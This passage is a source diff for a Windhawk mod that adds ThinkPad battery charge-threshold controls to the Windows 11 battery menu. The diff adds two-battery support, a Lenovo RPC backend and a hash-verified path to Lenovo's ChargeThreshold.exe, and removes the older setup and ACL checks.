@@ -2,69 +2,92 @@
 // @id thinkpad-battery-controls
 // @name ThinkPad Battery Controls
 // @description Charge to full temporarily and restore Lenovo battery protection.
-// @version 0.6.6
+// @version 0.8.3
 // @author Bill Bauman
 // @github https://github.com/billbauman
 // @license Apache-2.0
 // @include explorer.exe
 // @architecture x86-64
-// @compilerOptions -lshell32 -luser32 -lole32 -lruntimeobject -lwindowsapp -lbcrypt -ladvapi32 -lcrypt32 -luuid -lkernel32
+// @compilerOptions -lshell32 -luser32 -lole32 -lruntimeobject -lwindowsapp -lbcrypt -ladvapi32 -lcrypt32 -luuid -lkernel32 -lrpcrt4 -fms-extensions
 // ==/WindhawkMod==
 // ==WindhawkModReadme==
 /*
 # ThinkPad Battery Controls
-Author and publisher: Bill Bauman. Copyright 2026 Bill Bauman.
-Apache-2.0. The full project name is claimed as a trademark of Bill Bauman,
-subject to applicable law. Fair use and truthful attribution are welcome.
-Modified forks and commercial sellers must use distinct product branding;
-this does not restrict commercial use of the Apache-licensed code.
-ThinkPad is Lenovo's trademark. No Lenovo or Microsoft endorsement is implied.
 
-Requires Lenovo Power Manager and Lenovo's signed ChargeThreshold.exe.
-Use Setup and diagnostics to download it into Program Files. Leave the path blank in Settings for automatic discovery. Right-click the Windows battery icon for controls.
-Temporary overrides restore the saved limits at 100% or after eight hours.
-If Vantage has already enabled a range, that newer choice is preserved. State
-survives restarts. Disabling the mod attempts restoration.
-Only a single battery is supported. Unknown responses fail closed.
-Controls are integrated into the existing Windows battery icon.
-Open Manage presets in the battery menu to edit up to 20 saved presets and choose up to five quick favorites.
-Lenovo's utility is separately licensed.
+Right-click the Windows battery icon to set charging limits, apply saved presets,
+or temporarily charge to full. Uses Windows 11 menus without an extra tray icon.
 
-## Setup help
-Use Setup and diagnostics in the battery menu to check your model, utility,
-Lenovo PM Service, and battery communication. Missing or inaccessible components
-are explained with official links. Download and set up installs the utility after Windows administrator approval.
+The manufacturer should have made these everyday controls part of the Windows
+battery menu. It is a shame they did not. Feedback and compatibility reports are welcome.
 
-- [ChargeThreshold.exe](https://download.lenovo.com/pccbbs/thinkvantage_en/metroapps/Vantage/ChargeThreshold/ChargeThreshold.exe): use the setup button, or place it under Program Files/ThinkPad Battery Controls with administrator-only write access. A blank path setting discovers it automatically.
-- [Lenovo Power and Battery Driver](https://support.lenovo.com/us/en/downloads/ds541411-lenovo-settings-power-manager-for-windows-10-version-1703-or-later-thinkpad): check supported models first.
-- [Lenovo PC Support](https://pcsupport.lenovo.com/): select your model, then Drivers & Software.
+## Setup
+Choose a backend in Windhawk Settings:
+- **Integrated Lenovo service** (default): no utility download. Requires compatible
+  Lenovo Power Manager service and drivers.
+- **Lenovo ChargeThreshold.exe**: [download Lenovo's utility](https://download.lenovo.com/pccbbs/thinkvantage_en/metroapps/Vantage/ChargeThreshold/ChargeThreshold.exe),
+  save it wherever you prefer on a local drive, and enter its full path in Settings.
+  The mod verifies the reviewed executable before running it. It never downloads,
+  installs or elevates anything. Setup and diagnostics includes the download link.
 
-## Compatibility and setup details
-Tested on a ThinkPad P14s Gen 6 AMD with English utility output. Other models
-and localized output have not been verified. Only a single battery is supported.
-Taskbar integration uses private Windows symbols and can stop working after a
-Windows update. The recovery worker remains available if symbols are missing.
-If an outstanding worker or UI delegate prevents safe unloading, the mod retains
-its DLL. Restart Explorer or sign out before enabling that same version again.
-The administrator prompt for setup names Windows Command Processor, published
-by Microsoft. It launches the verified setup script through system PowerShell;
-it is not a Lenovo installer prompt. Drivers must be installed separately.
+The gear beside the charge summary opens diagnostics and a driver link based on
+this machine's detected model. No serial number is read or sent. Drivers are installed separately.
 
-Driver links use your detected machine type and Lenovo's model redirect.
-Unknown models have a product-selector fallback. No serial number is read or sent.
+## Charging and presets
+Save up to 20 named presets and choose up to five quick favorites. Manage presets
+is available in Set charge threshold and at the bottom of Apply charging preset.
+Quick presets apply to both batteries. Set charge threshold can edit each battery
+separately or link their limits with the integrated backend. Each result is read back.
+
+Charge to full saves the original limits, disables them temporarily, then restores
+at 100% or after eight hours. Cancel restores immediately. A newer enabled range
+from Vantage is preserved. The integrated backend restores each battery separately;
+Lenovo's executable cannot restore different ranges on two batteries. Select the
+integrated backend for that situation. Missing batteries defer restoration safely.
+
+**Thresholds persist after this mod is disabled or removed.** Disabling attempts
+restoration of a pending full-charge request. If restoration fails, Explorer crashes,
+or the mod is removed while it cannot run, limits may remain off and charging can
+continue to 100% until the mod runs again or you set limits in Vantage. Removing
+the mod also removes its Windhawk recovery data. Restore protection before removal.
+
+## Advanced controls
+Battery health shows supported readings. Power offers the verified three-state USB
+control. Calibration requires a separate confirmation and connected power; it saves
+current limits and blocks charging edits while running. Cancellation also requires
+confirmation. Removing the mod during calibration loses saved recovery: check its
+state and charging limits in Vantage. Cooling and airplane controls remain omitted
+until supported behavior is verified. Calibration is not a battery-health treatment.
+
+## Compatibility
+Tested on a ThinkPad P14s Gen 6 AMD with one battery. Two-battery behavior has
+mock coverage but needs a two-battery hardware report. The executable backend
+requires English output. Private taskbar symbols can change after Windows updates.
+
+Author/publisher: Bill Bauman. Apache-2.0. Project-name trademark and attribution
+terms are in the source repository; Lenovo's executable remains separately licensed.
+No Lenovo or Microsoft endorsement is implied.
 */
 // ==/WindhawkModReadme==
 // ==WindhawkModSettings==
 /*
+- backend: native
+  $name: Charging backend
+  $description: Integrated calls use Lenovo Power Manager directly. The executable option uses Lenovo's separately downloaded utility. No automatic fallback occurs.
+  $options:
+  - native: Integrated Lenovo service
+  - executable: Lenovo ChargeThreshold.exe
 - utilityPath: ""
-  $name: Utility path (leave blank for automatic location)
-  $description: Use Setup and diagnostics in the battery menu to download and install the utility. Custom paths must be administrator-protected.
+  $name: Full path to ChargeThreshold.exe (executable backend only)
+  $description: Download the linked Lenovo utility yourself, save it in a local folder of your choice, then enter the full executable path here. The integrated backend ignores this setting.
 */
 // ==/WindhawkModSettings==
 #include <windows.h>
 #include <shellapi.h>
 #include <shlobj.h>
 #include <windhawk_api.h>
+#include <windhawk_utils.h>
+#include <optional>
+#include <list>
 #include <string>
 #include <string_view>
 #include <charconv>
@@ -79,60 +102,13 @@ Unknown models have a product-selector fallback. No serial number is read or sen
 #include <deque>
 #include <algorithm>
 #include <functional>
+#include <rpc.h>
+#include <rpcndr.h>
+#include <sstream>
 
-// BEGIN TESTABLE ENGINE
-namespace Engine {
-std::mutex mutex;
-bool alive = true;
-void SetInt(PCWSTR key, int value) {
-  std::lock_guard lock(mutex);
-  if (alive)
-    Wh_SetIntValue(key, value);
-}
-void SetString(PCWSTR key, PCWSTR value) {
-  std::lock_guard lock(mutex);
-  if (alive)
-    Wh_SetStringValue(key, value);
-}
-int SettingInt(PCWSTR key) {
-  std::lock_guard lock(mutex);
-  return alive ? Wh_GetIntSetting(key) : 0;
-}
-std::wstring Setting(PCWSTR key) {
-  std::lock_guard lock(mutex);
-  if (!alive)
-    return {};
-  auto raw = Wh_GetStringSetting(key);
-  std::wstring value = raw ? raw : L"";
-  Wh_FreeStringSetting(raw);
-  return value;
-}
-void Log(PCWSTR text) {
-  std::lock_guard lock(mutex);
-  if (alive)
-    Wh_Log(L"%s", text);
-}
-void Close() {
-  std::lock_guard lock(mutex);
-  alive = false;
-}
-}  // namespace Engine
-// END TESTABLE ENGINE
 void AttachNativeMenu();
-std::atomic<bool> unloading = false;
-std::atomic<bool> retainModule = false;
-std::atomic<bool> symbolsReady = false;
-void RetainModule(PCWSTR reason) noexcept {
-  OutputDebugStringW(L"ThinkPad Battery Controls: retaining module: ");
-  OutputDebugStringW(reason);
-  OutputDebugStringW(L"\n");
-  HMODULE module = nullptr;
-  GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_PIN,
-                     reinterpret_cast<PCWSTR>(&RetainModule), &module);
-  retainModule = true;
-}
+std::atomic<bool> unloading = false, symbolsReady = false;
 namespace BatteryControls {
-// BEGIN TESTABLE HANDLE
 struct Handle {
   HANDLE value = nullptr;
   Handle() = default;
@@ -147,64 +123,98 @@ struct Handle {
   HANDLE* out() { return &value; }
   explicit operator bool() const { return value && value != INVALID_HANDLE_VALUE; }
 };
-// END TESTABLE HANDLE
 HANDLE threadHandle = nullptr, stopEvent = nullptr, wakeEvent = nullptr;
-std::atomic<HANDLE> setupThread = nullptr;
-std::atomic<bool> setupRunning = false, setupCompleted = false;
 std::mutex queueMutex;
 std::deque<std::pair<int, int>> commands;
 std::atomic<bool> active = false, busy = false, refreshing = false;
 std::atomic<ULONGLONG> shutdownDeadline = 0;
+struct Pack {
+  DWORD present = 0, enabled = 0;
+  int start = 0, stop = 0;
+};
 struct State {
   bool valid = false, enabled = false;
   int start = 0, stop = 0;
+  bool mixed = false;
+  Pack packs[2]{};
 };
-// BEGIN TESTABLE CORE
 constexpr bool ValidRange(int start, int stop) {
   return start >= 5 && start < stop && stop <= 100;
 }
+bool ValidPack(const Pack& p) {
+  return p.present <= 1 && p.enabled <= 1 &&
+         (!p.enabled || (p.present && ValidRange(p.start, p.stop)));
+}
+void Summarize(State& s) {
+  const Pack* first = nullptr;
+  s.enabled = false;
+  s.mixed = false;
+  s.start = s.stop = 0;
+  for (auto& p : s.packs)
+    if (p.present) {
+      s.enabled = s.enabled || p.enabled;
+      if (!first) {
+        first = &p;
+        s.start = p.start;
+        s.stop = p.stop;
+      } else if (p.enabled != first->enabled ||
+                 (p.enabled && (p.start != first->start || p.stop != first->stop)))
+        s.mixed = true;
+    }
+  s.valid = first != nullptr;
+  if (s.mixed)
+    s.start = s.stop = 0;
+}
 struct Recovery {
-  DWORD magic = 0x54424332, version = 1, active = 0, start = 0, stop = 0;
+  DWORD magic = 0x54424332, version = 2, active = 0, reserved = 0;
   ULONGLONG deadline = 0;
+  Pack prior[2]{};
 };
-bool ValidRecovery(const Recovery& r, ULONGLONG now) {
-  return r.magic == 0x54424332 && r.version == 1 && r.active <= 1 &&
-         (!r.active ||
-          (ValidRange(r.start, r.stop) && r.deadline > 0 && r.deadline <= 0x7fffffffffffffffULL));
+bool ValidRecovery(const Recovery& r, ULONGLONG) {
+  if (r.magic != 0x54424332 || r.version != 2 || r.active > 1 || r.reserved ||
+      !ValidPack(r.prior[0]) || !ValidPack(r.prior[1]))
+    return false;
+  return !r.active || ((r.prior[0].enabled || r.prior[1].enabled) && r.deadline > 0 &&
+                       r.deadline <= 0x7fffffffffffffffULL);
 }
 bool RecoveryDue(const Recovery& r, ULONGLONG now) {
   return r.active && (now >= r.deadline || r.deadline - now > 8 * 3600 + 300);
 }
 State Parse(std::string_view text) {
   State s;
-  auto pos = text.find("Battery #");
-  if (pos == text.npos || text.find("Battery #", pos + 1) != text.npos)
-    return s;
-  auto line = text.substr(pos);
-  line = line.substr(0, line.find_first_of("\r\n"));
-  if (line == "Battery #1: OFF.") {
-    s.valid = true;
-    return s;
-  }
-  constexpr std::string_view prefix = "Battery #1: Start at ", middle = "%, Stop at ";
-  if (!line.starts_with(prefix) || !line.ends_with("%."))
-    return s;
-  line.remove_prefix(prefix.size());
-  line.remove_suffix(2);
-  auto split = line.find(middle);
-  if (split == line.npos)
-    return s;
   auto number = [](std::string_view value, int& out) {
     auto r = std::from_chars(value.data(), value.data() + value.size(), out);
     return r.ec == std::errc{} && r.ptr == value.data() + value.size();
   };
-  if (!number(line.substr(0, split), s.start) ||
-      !number(line.substr(split + middle.size()), s.stop) || !ValidRange(s.start, s.stop))
-    return {};
-  s.valid = s.enabled = true;
+  size_t pos = 0;
+  while ((pos = text.find("Battery #", pos)) != text.npos) {
+    auto line = text.substr(pos);
+    line = line.substr(0, line.find_first_of("\r\n"));
+    pos += line.size();
+    if (line.size() < 12 || (line[9] != '1' && line[9] != '2') || line.substr(10, 2) != ": ")
+      return {};
+    auto& pack = s.packs[line[9] - '1'];
+    if (pack.present)
+      return {};
+    pack.present = 1;
+    auto value = line.substr(12);
+    if (value == "OFF.")
+      continue;
+    constexpr std::string_view prefix = "Start at ", middle = "%, Stop at ";
+    if (!value.starts_with(prefix) || !value.ends_with("%."))
+      return {};
+    value.remove_prefix(prefix.size());
+    value.remove_suffix(2);
+    auto split = value.find(middle);
+    if (split == value.npos || !number(value.substr(0, split), pack.start) ||
+        !number(value.substr(split + middle.size()), pack.stop) ||
+        !ValidRange(pack.start, pack.stop))
+      return {};
+    pack.enabled = 1;
+  }
+  Summarize(s);
   return s;
 }
-// END TESTABLE CORE
 Recovery recovery;
 bool recoveryInvalid = false;
 ULONGLONG Now() {
@@ -217,34 +227,18 @@ struct Snapshot {
 };
 std::mutex stateMutex;
 Snapshot snapshot;
-std::wstring operationStatus, setupStatus;
+std::wstring operationStatus;
 ULONGLONG statusAt = 0;
 Snapshot ReadSnapshot() {
   std::lock_guard lock(stateMutex);
   return snapshot;
-}
-int UiInt(PCWSTR key, int fallback = 0) {
-  auto snap = ReadSnapshot();
-  if (wcscmp(key, L"cacheValid") == 0)
-    return snap.state.valid && !refreshing;
-  if (wcscmp(key, L"cacheEnabled") == 0)
-    return snap.state.enabled;
-  if (wcscmp(key, L"cacheStart") == 0)
-    return snap.state.valid && ValidRange(snap.state.start, snap.state.stop) ? snap.state.start
-                                                                             : fallback;
-  if (wcscmp(key, L"cacheStop") == 0)
-    return snap.state.valid && ValidRange(snap.state.start, snap.state.stop) ? snap.state.stop
-                                                                             : fallback;
-  if (wcscmp(key, L"utilityCheck") == 0)
-    return snap.utility;
-  return fallback;
 }
 void SetUtility(int value) {
   {
     std::lock_guard lock(stateMutex);
     snapshot.utility = value;
   }
-  Engine::SetInt(L"utilityCheck", value);
+  Wh_Log(L"utilityCheck=%d", int(value));
 }
 void Status(PCWSTR value) noexcept {
   try {
@@ -253,20 +247,9 @@ void Status(PCWSTR value) noexcept {
       operationStatus = value;
       statusAt = GetTickCount64();
     }
-    Engine::SetString(L"operationStatus", value);
+    Wh_Log(L"operationStatus: %s", value);
   } catch (...) {
   }
-}
-void SetupStatus(PCWSTR value) noexcept {
-  try {
-    std::lock_guard lock(stateMutex);
-    setupStatus = value;
-  } catch (...) {
-  }
-}
-std::wstring SetupText() {
-  std::lock_guard lock(stateMutex);
-  return setupStatus;
 }
 std::wstring RecentStatus() {
   std::lock_guard lock(stateMutex);
@@ -278,77 +261,18 @@ void Error() noexcept {
 bool Active() {
   return active.load();
 }
-std::wstring DefaultUtility() {
-  PWSTR raw = nullptr;
-  if (FAILED(SHGetKnownFolderPath(FOLDERID_ProgramFiles, KF_FLAG_DEFAULT, nullptr, &raw)))
-    return {};
-  std::wstring path(raw);
-  CoTaskMemFree(raw);
-  return path + L"\\ThinkPad Battery Controls\\ChargeThreshold.exe";
-}
 std::wstring UtilityPath() {
-  std::wstring path = Engine::Setting(L"utilityPath");
-  return path.empty() ? DefaultUtility() : path;
-}
-// The executable and all ancestors must have trusted owners and no untrusted
-// allow ACE granting modification. Reject unfamiliar ACE forms conservatively.
-// BEGIN TESTABLE TRUST
-bool TrustedSid(PSID sid) {
-  BYTE system[SECURITY_MAX_SID_SIZE], admins[SECURITY_MAX_SID_SIZE];
-  DWORD size = sizeof(system);
-  CreateWellKnownSid(WinLocalSystemSid, nullptr, system, &size);
-  size = sizeof(admins);
-  CreateWellKnownSid(WinBuiltinAdministratorsSid, nullptr, admins, &size);
-  if (EqualSid(sid, system) || EqualSid(sid, admins))
-    return true;
-  PSID installer = nullptr;
-  bool result = false;
-  if (ConvertStringSidToSidW(L"S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464",
-                             &installer)) {
-    result = EqualSid(sid, installer);
-    LocalFree(installer);
-  }
-  return result;
-}
-bool ProtectedObject(const std::wstring& path, bool volumeRoot = false) {
-  PSECURITY_DESCRIPTOR sd = nullptr;
-  PACL acl = nullptr;
-  PSID owner = nullptr;
-  if (GetNamedSecurityInfoW(path.c_str(), SE_FILE_OBJECT,
-                            OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, &owner, nullptr,
-                            &acl, nullptr, &sd) != ERROR_SUCCESS)
-    return false;
-  bool ok = owner && TrustedSid(owner) && acl;
-  DWORD writes = FILE_WRITE_DATA | FILE_APPEND_DATA | FILE_WRITE_EA | FILE_WRITE_ATTRIBUTES |
-                 FILE_DELETE_CHILD | DELETE | WRITE_DAC | WRITE_OWNER | GENERIC_WRITE | GENERIC_ALL;
-  // Creating unrelated folders on C:\ does not grant modification of an
-  // existing protected Program Files tree. Delete-child/ACL writes still fail.
-  if (volumeRoot)
-    writes &= ~(FILE_WRITE_DATA | FILE_APPEND_DATA);
-  for (DWORD i = 0; ok && i < acl->AceCount; i++) {
-    ACE_HEADER* head = nullptr;
-    if (!GetAce(acl, i, reinterpret_cast<void**>(&head))) {
-      ok = false;
-      break;
-    }
-    if (head->AceFlags & INHERIT_ONLY_ACE)
-      continue;
-    if (head->AceType == ACCESS_ALLOWED_ACE_TYPE) {
-      auto ace = reinterpret_cast<ACCESS_ALLOWED_ACE*>(head);
-      if ((ace->Mask & writes) && !TrustedSid(&ace->SidStart))
-        ok = false;
-    } else if (head->AceType != ACCESS_DENIED_ACE_TYPE)
-      ok = false;
-  }
-  LocalFree(sd);
-  return ok;
+  return std::wstring(WindhawkUtils::StringSetting::make(L"utilityPath").get());
 }
 bool LockUtility(const std::wstring& path, Handle& file, std::vector<HANDLE>& directories) {
   if (path.size() < 4 || path[1] != L':' || path[2] != L'\\' || path.find(L'"') != path.npos)
     return false;
-  wchar_t full[32768];
-  DWORD n = GetFullPathNameW(path.c_str(), 32768, full, nullptr);
-  if (!n || n >= 32768 || _wcsicmp(full, path.c_str()))
+  DWORD n = GetFullPathNameW(path.c_str(), 0, nullptr, nullptr);
+  if (!n || n > 32768)
+    return false;
+  std::wstring full(n, L'\0');
+  DWORD copied = GetFullPathNameW(path.c_str(), n, full.data(), nullptr);
+  if (!copied || copied >= n || _wcsicmp(full.c_str(), path.c_str()))
     return false;
   // Lock every parent against deletion/renaming for the whole child lifetime.
   for (size_t pos = 3;;) {
@@ -364,24 +288,26 @@ bool LockUtility(const std::wstring& path, Handle& file, std::vector<HANDLE>& di
     directories.push_back(h);
     FILE_ATTRIBUTE_TAG_INFO info{};
     if (!GetFileInformationByHandleEx(h, FileAttributeTagInfo, &info, sizeof(info)) ||
-        (info.FileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) || !ProtectedObject(parent))
+        (info.FileAttributes & FILE_ATTRIBUTE_REPARSE_POINT))
       return false;
     pos = end + 1;
   }
-  if (!ProtectedObject(path.substr(0, 3), true))
-    return false;
   file.value = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING,
                            FILE_FLAG_OPEN_REPARSE_POINT, nullptr);
   if (!file)
     return false;
   FILE_ATTRIBUTE_TAG_INFO info{};
-  wchar_t finalPath[32768];
+
   if (!GetFileInformationByHandleEx(file, FileAttributeTagInfo, &info, sizeof(info)) ||
-      (info.FileAttributes & (FILE_ATTRIBUTE_REPARSE_POINT | FILE_ATTRIBUTE_DIRECTORY)) ||
-      !ProtectedObject(path))
+      (info.FileAttributes & (FILE_ATTRIBUTE_REPARSE_POINT | FILE_ATTRIBUTE_DIRECTORY)))
     return false;
-  n = GetFinalPathNameByHandleW(file, finalPath, 32768, FILE_NAME_NORMALIZED | VOLUME_NAME_DOS);
-  if (!n || n >= 32768 || _wcsicmp(finalPath, (L"\\\\?\\" + path).c_str()))
+  n = GetFinalPathNameByHandleW(file, nullptr, 0, FILE_NAME_NORMALIZED | VOLUME_NAME_DOS);
+  if (!n || n > 32768)
+    return false;
+  std::wstring finalPath(n, L'\0');
+  copied =
+      GetFinalPathNameByHandleW(file, finalPath.data(), n, FILE_NAME_NORMALIZED | VOLUME_NAME_DOS);
+  if (!copied || copied >= n || _wcsicmp(finalPath.c_str(), (L"\\\\?\\" + path).c_str()))
     return false;
   BCRYPT_ALG_HANDLE algorithm = nullptr;
   BCRYPT_HASH_HANDLE hash = nullptr;
@@ -417,8 +343,6 @@ bool LockUtility(const std::wstring& path, Handle& file, std::vector<HANDLE>& di
                                     0xEE, 0x0A, 0x9A, 0x9C, 0xE5, 0xEE, 0x83, 0x80};
   return ok && memcmp(digest, expected, 32) == 0;
 }
-// END TESTABLE TRUST
-// BEGIN TESTABLE RUNNER
 bool Run(const std::wstring& args, std::string& output) {
   auto shutdown = shutdownDeadline.load();
   if ((shutdown && GetTickCount64() >= shutdown) ||
@@ -473,8 +397,8 @@ bool Run(const std::wstring& args, std::string& output) {
   if (!job ||
       !SetInformationJobObject(job, JobObjectExtendedLimitInformation, &limits, sizeof(limits)))
     return false;
-  wchar_t system[32768];
-  if (!GetSystemDirectoryW(system, 32768))
+  wchar_t system[MAX_PATH];
+  if (!GetSystemDirectoryW(system, MAX_PATH))
     return false;
   PROCESS_INFORMATION pi{};
   std::wstring command = L"\"" + path + L"\" " + args;
@@ -531,101 +455,643 @@ bool Run(const std::wstring& args, std::string& output) {
   DWORD code = 1;
   if (!GetExitCodeProcess(process, &code))
     return false;
-  Engine::SetInt(L"utilityExit", code);
+  Wh_Log(L"utilityExit=%d", int(code));
   return done && !overflow && code == 0;
 }
-// END TESTABLE RUNNER
-State Query() {
+namespace NativeRpc {
+// Generated NDR descriptors from research/lenovo-rpc/native.idl using Windows SDK MIDL.
+// Only explicitly named, typed operations are callable. No Lenovo executable code is embedded.
+const unsigned char types[] = {
+    0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xe1,
+    0x00, 0x00, 0x30, 0x41, 0x00, 0x00, 0x11, 0x0c, 0x06, 0x5c, 0x11, 0x0c, 0x08, 0x5c, 0x00,
+};
+const unsigned char procOpen[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x32, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x38, 0x00, 0x40, 0x01, 0x0a, 0x01, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x01, 0x08, 0x00, 0x06, 0x00,
+};
+const unsigned char procClose[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x08, 0x00, 0x30, 0xe0, 0x00,
+    0x00, 0x00, 0x00, 0x38, 0x00, 0x38, 0x00, 0x40, 0x01, 0x0a, 0x01, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x00, 0x00, 0x0e, 0x00,
+};
+const unsigned char procCoolCap[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x10, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x24, 0x00, 0x1a, 0x00, 0x40, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x50, 0x21, 0x08, 0x00, 0x06, 0x00,
+};
+const unsigned char procCoolingCap[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x10, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x24, 0x00, 0x1a, 0x00, 0x40, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x50, 0x21, 0x08, 0x00, 0x06, 0x00,
+};
+const unsigned char procAirplaneCap[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x10, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x24, 0x00, 0x1a, 0x00, 0x40, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x50, 0x21, 0x08, 0x00, 0x06, 0x00,
+};
+const unsigned char procUsbCap[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x10, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x24, 0x00, 0x1a, 0x00, 0x40, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x50, 0x21, 0x08, 0x00, 0x06, 0x00,
+};
+const unsigned char procUsbValue[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x24, 0x00, 0x1c, 0x00, 0x40, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x50, 0x21, 0x08, 0x00, 0x08, 0x00,
+};
+const unsigned char procAirplaneValue[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x10, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x24, 0x00, 0x1a, 0x00, 0x40, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x50, 0x21, 0x08, 0x00, 0x06, 0x00,
+};
+const unsigned char procCoolingAuto[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x15, 0x00, 0x10, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x24, 0x00, 0x1a, 0x00, 0x40, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x50, 0x21, 0x08, 0x00, 0x06, 0x00,
+};
+const unsigned char procCoolingValue[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x10, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x24, 0x00, 0x1a, 0x00, 0x40, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x50, 0x21, 0x08, 0x00, 0x06, 0x00,
+};
+const unsigned char procCoolValue[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x17, 0x00, 0x10, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x24, 0x00, 0x1a, 0x00, 0x40, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x50, 0x21, 0x08, 0x00, 0x06, 0x00,
+};
+const unsigned char procSetAirplane[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x10, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x2a, 0x00, 0x00, 0x00, 0x40, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00, 0x06, 0x00,
+};
+const unsigned char procSetCoolingAuto[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x1d, 0x00, 0x10, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x2a, 0x00, 0x00, 0x00, 0x40, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00, 0x06, 0x00,
+};
+const unsigned char procSetCooling[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x1e, 0x00, 0x10, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x2a, 0x00, 0x00, 0x00, 0x40, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00, 0x06, 0x00,
+};
+const unsigned char procSetUsb[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x21, 0x00, 0x10, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x2c, 0x00, 0x00, 0x00, 0x40, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00,
+};
+const unsigned char procResetCap[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x22, 0x00, 0x18, 0x00, 0x30, 0x40, 0x00,
+    0x00, 0x00, 0x00, 0x2c, 0x00, 0x1a, 0x00, 0x40, 0x03, 0x0a, 0x01, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x50,
+    0x21, 0x08, 0x00, 0x06, 0x00, 0x48, 0x00, 0x10, 0x00, 0x08, 0x00,
+};
+const unsigned char procQuery[] = {
